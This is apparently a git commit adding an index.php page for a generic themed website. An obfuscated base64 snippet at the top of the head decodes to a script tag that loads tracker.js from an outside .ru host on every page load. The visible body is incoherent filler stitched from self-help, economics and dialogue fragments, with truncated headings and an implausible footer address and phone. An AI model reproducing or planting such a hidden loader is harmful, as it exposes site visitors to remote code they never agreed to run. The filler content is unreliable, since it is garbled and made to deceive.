2c4e3bb8732718e835bca202029ce9a32d59e848
onxezpog <79170596+onxezpog@users.noreply.github.com>
2021-02-16 22:46:58 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9xcmg2ZWRpOGRsenA4eGg0N20iPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Can you see yourself as if through the eyes of another p</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="pyqraebmp973bjqdz">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="uu123z8t88z3at1">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Can you see yourself as if through the eyes of another p</h1>
+	</section>
+
+
+	<section class="our-work" class="wcw6lae01pwzehf">
+		<h3 class="title">A powerful tandem, a team, has emerged.This man's s</h3>
+		<p>Identify the consequences, both positive and negative, that will follow the assessment.  It leads to a balance of short and long term.  If, in any range of output, long-term average costs do not change with changes in the volume of output, then there is a constant effect of changes in the scale of production.  And, in addition, we have an independent will - the ability to act based on self-awareness, regardless of any outside influence.  With a weekly Quadrant II organization, daily planning appears in the form of daily adaptation, prioritization of actions and appropriate responses to contingencies, relationships and events.  “Do you think he understands that Jenny’s newborn?” I asked. </p>
+		<hr>
+
+		<ul class="grid" class="lzdad29on1qg60yur12">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="pyqraebmp973bjqdz">
+		<h3 class="title">You studied.  Seeking the meaning of your </h3>
+		<p>They didn't have to fight for oxygen.  Financial support from the state inhibits the restructuring of enterprises, does not stimulate their adaptation to the market environment.  - All right, dad, I'm tired! Who needs this school! - What happened, son? (Proving.) - There is no benefit from this study! A stupid waste of time! - Well, sonny, you just don't see the results yet.  Various types of businesses, community groups and organizations, including families, can be proactive.  They work as simple order takers.  Types of monopolies 1.  The central issue of the state is the problem of developing a strategy for the country's socio-economic development with a clear definition of ultimate goals.  The traditional, centuries-old form of government was monarchy - the divine right of kings.  It makes a person accountable for doing his job and evaluating his results and provides consequences as a natural result of activities. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="uu123z8t88z3at1" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="wcw6lae01pwzehf">
+		<h3 class="title">Take a few minutes and write down your roles circle those that </h3>
+		<p>Of course, some events can give us physical or economic trouble.  Such people become reactive and, in fact, give up, in the hope that nothing bad will happen to them.  - But we agreed! The boys can't wait.  Private property with all modifications (joint-stock, cooperative) belongs to non-state property.  In reality, perfect competition is quite rare. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="lzdad29on1qg60yur12" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="pyqraebmp973bjqdz">
+		<h3 class="title">There are times when neither the teacher nor the st</h3>
+		<p>Remember, "When you lift one end of the stick, you raise the other." Principles always have natural consequences.  This creates serious problems for both the people themselves and the business, especially if competitors operate on a Win / Win approach and synergy.  You have a sense of Personal Mission for what you are trying to do and it gives you joy.  The left hemisphere is mainly responsible for logical-verbal activity, and the right one for intuitive-creative.  (Advice.) - Well, I don't know.  I believe that the more in harmony a person lives with conscience, the more he can realize his potential; accordingly, the less the degree of his agreement with conscience, the less capable he is to rise above animal existence.  Listen to your speech and the speech of others throughout the day.  Subjects of the market economy: 1) a household is an economic unit consisting of one or several persons, which: a) ensures the production and reproduction of human capital;b) makes decisions independently; c) is the owner of any factor of production; d) strives for maximum satisfaction of their needs; 2) enterprise - an economic unit that: a) uses factors of production to manufacture products for the purpose of selling them; b) strives to maximize profits; c) makes decisions independently; 3) the state - represented by government agencies exercising legal and political power to ensure control over economic entities and over the market to achieve public goals. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="uu123z8t88z3at1" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="wcw6lae01pwzehf">
+		<h3 class="title">It gives, in particular, information about</h3>
+		<p>60.  We were asked to evaluate and improve the management training program for which the bank allocated $ 750,000 annually.  Like breathing exercises that help the unity of the soul and body, the process of writing, as a type of neuropsychiatric muscular activity, helps to unite the conscious and subconscious.  As a result, we get seven points, each of which expresses the amount of goods that the consumer decides to buy at the corresponding price.  As soon as I realized that I had completely misinterpreted the whole situation and overdone it, I immediately went to David to ask for forgiveness.  25.  By comparing any two sets, the consumer may prefer one product over the other. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="lzdad29on1qg60yur12" class="title">She began to tell me about her father, how he taught history in</h3>	
+		<p>What would you like to do? - Dad, come on.  However, world experience shows that the functions of taxes change with the development of the state.  By adopting these principles, we develop the Win / Win Sufficiency Mindset and the sincerity of Habit 5.  The choice of an alternative is often associated with the answer to the question of what to prefer: quick profit at the cost of future losses or current losses for the sake of profit in the future? On the one hand, this complicates the estimation of costs.  Better than compromise.  Then the captain ordered the signalman: - Tell the ship: "We are heading for a collision, I advise you to change the course by 20 degrees!" Received a response signal: - It is desirable that you change course by 20 degrees! The captain says: - Tell: "I am the captain, change course by 20 degrees!" “I’m a second class sailor,” the signal comes back.  - I put you in an awkward position in the presence of your friends.  Imagine a situation that may arise in the near future in your life and in which you, judging by past experience, will tend to behave reactively.  But our characterour inner being in no way should suffer from this.  FUNCTIONS AND CLASSIFICATION OF THE MARKET The market has a huge impact on all aspects of economic life, performing a number of economic functions: 1) regulating. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="pyqraebmp973bjqdz">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="uu123z8t88z3at1"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="wcw6lae01pwzehf"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="lzdad29on1qg60yur12"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>1533 Abshire Stream, Suite 834, 76724-3449, Lake Dorothy, South Dakota, United States</p>
+		<p>Phone number: +4(67)420-5096518</p>
+	</footer>
+
+</body>
+
+</html>
